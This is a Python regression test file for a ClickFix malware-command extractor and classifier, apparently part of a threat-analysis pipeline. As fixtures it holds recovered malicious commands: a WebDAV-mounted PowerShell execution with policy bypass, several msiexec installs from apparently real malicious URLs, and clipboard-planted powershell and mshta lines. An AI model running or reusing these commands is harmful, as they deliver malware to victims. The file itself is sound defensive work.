"""Regression tests for the three refined extractor-precision fixes.

Fixtures are sanitized/derived from real evidence collected 2026-10-14:
  - C1  23.94.252.153/68993  -> MSI binary w/ VBScript concat template
  - C6  devverif.info/*.zip  -> archive candidate
Historical positives (WebDAV + 4x msiexec) and the JSONP template negative are
re-run to prove no regression. NOTE: the historical samples' original source
pages are DEAD; these are regression fixtures, NOT independent proof of current
real-world recovery.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from extractor import _is_binary_body, _printable_ratio  # noqa: E402
from validate import (  # noqa: E402
    R_UNRESOLVED_CONCAT, validate_payload,
)
from classify import classify_payload, PKG_BATCH, PKG_PS1  # noqa: E402

# --- real recovered command texts (sanitized; historical, source now dead) ---
WEBDAV = ('cmd.exe /c net use Z: http://144.31.47.76/webdav /persistent:no '
          '&& powershell -ExecutionPolicy Bypass -File "Z:\\script.ps1" & net use Z: /delete')
MSIEXEC = [
    "msiexec /i https://pizzabyte.com.au/smartdetection/deviceverification/CF/path/captcha",
    "msiexec /i https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/",
    "msiexec /i https://i-like-ele-phants-verification.live/iamchallenge/verification/UserID7383526",
    "msiexec /i https://kloudtechnology.in/step /qn",
]
JSONP_TEMPLATE = ("Write-Host 'Cloudflare' -F Cyan; $w=New-Object Net.WebClient; "
                  "$u='REPLACE_SERVER/get_verify?i=REPLACE_ID'; $w.DownloadFile($u,$z)")
# C1 exact recovered fragment (MSI VBScript concatenation of unresolved vars)
MSI_CONCAT = ('""" & nqklncw & """ -NoProfile -ExecutionPolicy Bypass '
              '-File """ & sjopqxtu & """ """ & wubtaew & """')


class TestFix1BinaryGuard(unittest.TestCase):
    # binary bodies rejected
    def test_ole_msi_magic_rejected(self):
        self.assertTrue(_is_binary_body("application/octet-stream", b"\xd0\xcf\x11\xe0\x00\x01"))
    def test_pe_magic_rejected(self):
        self.assertTrue(_is_binary_body("", b"MZ\x90\x00\x03"))
    def test_zip_magic_rejected(self):
        self.assertTrue(_is_binary_body("application/octet-stream", b"PK\x03\x04zzzz"))
    def test_explicit_msi_ctype_rejected(self):
        self.assertTrue(_is_binary_body("application/x-msi", b"anything"))
    def test_image_ctype_rejected(self):
        self.assertTrue(_is_binary_body("image/png", b"\x89PNG"))
    def test_low_printable_octet_stream_rejected(self):
        self.assertTrue(_is_binary_body("application/octet-stream", bytes(range(0, 60)) * 4))
    # text bodies NEVER rejected (the key refinement)
    def test_declared_html_never_rejected_even_low_ratio(self):
        # UTF-8-heavy / unusual bytes but declared text/html -> must be accepted
        body = "<html>日本語 Ñoño emoji 😀 <script>x</script></html>".encode("utf-8")
        self.assertFalse(_is_binary_body("text/html; charset=utf-8", body))
    def test_declared_javascript_never_rejected(self):
        self.assertFalse(_is_binary_body("application/javascript", "変数=1;".encode("utf-8")))
    def test_declared_json_never_rejected(self):
        self.assertFalse(_is_binary_body("application/json", '{"q":"caña"}'.encode("utf-8")))
    def test_plain_html_accepted(self):
        self.assertFalse(_is_binary_body("text/html", b"<html><body>hi</body></html>"))
    def test_ambiguous_but_texty_accepted(self):
        self.assertFalse(_is_binary_body("", b"<script>navigator.clipboard.writeText('x')</script>"))

    def test_printable_ratio_sane(self):
        self.assertEqual(_printable_ratio(b""), 1.0)
        self.assertAlmostEqual(_printable_ratio(b"abc\x00\x00"), 3/5)


class TestFix2UnresolvedConcat(unittest.TestCase):
    # C1 negative: the unresolved VBScript concat must be rejected
    def test_msi_concat_rejected(self):
        r = validate_payload(MSI_CONCAT)
        self.assertFalse(r.valid)
        self.assertEqual(r.reason, R_UNRESOLVED_CONCAT)
    def test_msi_concat_not_classified_ps1(self):
        self.assertNotEqual(classify_payload(MSI_CONCAT).cape_package, PKG_PS1)
    # positives: real resolved commands must STILL validate (no regression)
    def test_webdav_still_valid(self):
        self.assertTrue(validate_payload(WEBDAV).valid)
    def test_webdav_still_batch(self):
        self.assertEqual(classify_payload(WEBDAV).cape_package, PKG_BATCH)
    def test_all_four_msiexec_still_valid_and_batch(self):
        for m in MSIEXEC:
            self.assertTrue(validate_payload(m).valid, m)
            self.assertEqual(classify_payload(m).cape_package, PKG_BATCH, m)
    # cmd '&&', WebDAV '& net use', PS call-operator '& "prog"' must NOT trip the rule
    def test_double_ampersand_not_rejected(self):
        self.assertTrue(validate_payload('cmd /c dir && whoami').valid)
    def test_ps_call_operator_not_rejected(self):
        self.assertTrue(validate_payload('powershell -c "& \\"C:\\\\Program Files\\\\x.exe\\" -nop"').valid)
    # JSONP template remains rejected (placeholder rule), still not a false positive
    def test_jsonp_template_rejected(self):
        self.assertFalse(validate_payload(JSONP_TEMPLATE).valid)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestBinaryResourceReason(unittest.TestCase):
    """End-to-end: a binary body yields failure_reason='binary_resource'
    (NOT 'page_unreachable'), and a texty JS served as octet-stream is kept."""
    import threading as _t
    from http.server import BaseHTTPRequestHandler, HTTPServer

    ROUTES = {}

    class _H(BaseHTTPRequestHandler):
        def do_GET(self):
            r = TestBinaryResourceReason.ROUTES.get(self.path)
            if r is None:
                self.send_error(404); return
            ctype, body = r
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body)
        def log_message(self, *a): pass

    @classmethod
    def setUpClass(cls):
        cls.srv = cls.HTTPServer(("127.0.0.1", 0), cls._H)
        cls._t.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.base = "http://127.0.0.1:%d" % cls.srv.server_port

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()

    def _extract(self, path):
        from config import ExtractConfig
        from extractor import extract_command
        return extract_command(self.base + path, ExtractConfig(fetch_timeout=5))

    def test_ole_msi_body_is_binary_resource(self):
        from extractor import FAIL_BINARY
        self.ROUTES["/msi"] = ("application/octet-stream",
                               b"\xd0\xcf\x11\xe0" + bytes(range(0, 60)) * 20)
        r = self._extract("/msi")
        self.assertIsNone(r.command_text)
        self.assertEqual(r.failure_reason, FAIL_BINARY)

    def test_explicit_msi_ctype_is_binary_resource(self):
        from extractor import FAIL_BINARY
        self.ROUTES["/x"] = ("application/x-msi", b"MZ" + b"\x00" * 500)
        self.assertEqual(self._extract("/x").failure_reason, FAIL_BINARY)

    def test_unreachable_stays_page_unreachable(self):
        from extractor import FAIL_PAGE_UNREACHABLE
        # nothing registered at this path -> 404 -> retrieval failure, not binary
        r = self._extract("/does-not-exist")
        self.assertEqual(r.failure_reason, FAIL_PAGE_UNREACHABLE)

    def test_js_as_octet_stream_not_suppressed(self):
        # texty JS mislabeled as octet-stream: high printable ratio -> KEPT
        js = b'navigator.clipboard.writeText("powershell -w hidden -nop");'
        self.ROUTES["/j"] = ("application/octet-stream", js)
        r = self._extract("/j")
        self.assertIsNotNone(r.command_text)  # recovered, not suppressed
        self.assertIn("powershell", r.command_text.lower())

    def test_html_with_embedded_base64_mz_not_suppressed(self):
        # HTML whose BODY contains a base64 'TVqQ' (MZ) blob must NOT be rejected
        html = (b'<html><script>var x="TVqQAAMAAAAEAAAA";'
                b'navigator.clipboard.writeText("mshta http://x.invalid/a.hta");</script></html>')
        self.ROUTES["/h"] = ("text/html", html)
        r = self._extract("/h")
        self.assertIsNotNone(r.command_text)
        self.assertIn("mshta", r.command_text.lower())
